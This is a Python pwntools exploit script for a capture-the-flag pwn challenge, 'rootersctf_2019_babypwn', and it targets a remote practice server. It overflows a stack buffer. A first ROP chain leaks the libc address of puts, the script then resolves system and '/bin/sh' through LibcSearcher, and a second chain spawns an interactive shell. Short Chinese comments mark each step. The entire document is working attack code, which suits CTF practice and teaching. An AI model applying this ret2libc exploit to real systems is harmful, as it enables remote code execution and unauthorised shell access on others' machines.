from pwn import *

context(log_level='debug')

#io=process("./rootersctf_2019_babypwn")
io=remote("node3.buuoj.cn",29520)
elf=ELF("./rootersctf_2019_babypwn")

io.recv()

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

main=0x401146

pop_rdi_ret=0x401223

ret=0x40101a

payload=b'A'*(0x100+0x8)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)

io.sendline(payload)

io.recvuntil(b'\x0a')

puts_addr=u64(io.recv(6).ljust(8,b'\x00'))

print(hex(puts_addr))

io.recv()

from LibcSearcher import *  

libc = LibcSearcher('puts',puts_addr)  
#获取libc加载地址  
libc_base = puts_addr - libc.dump('puts')  
#获取system地址  
system_addr = libc_base + libc.dump('system')  
#获取/bin/sh地址  
binsh_addr = libc_base + libc.dump('str_bin_sh')  


payload=b'A'*(0x100+0x8)+p64(ret)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)

io.sendline(payload)

io.interactive()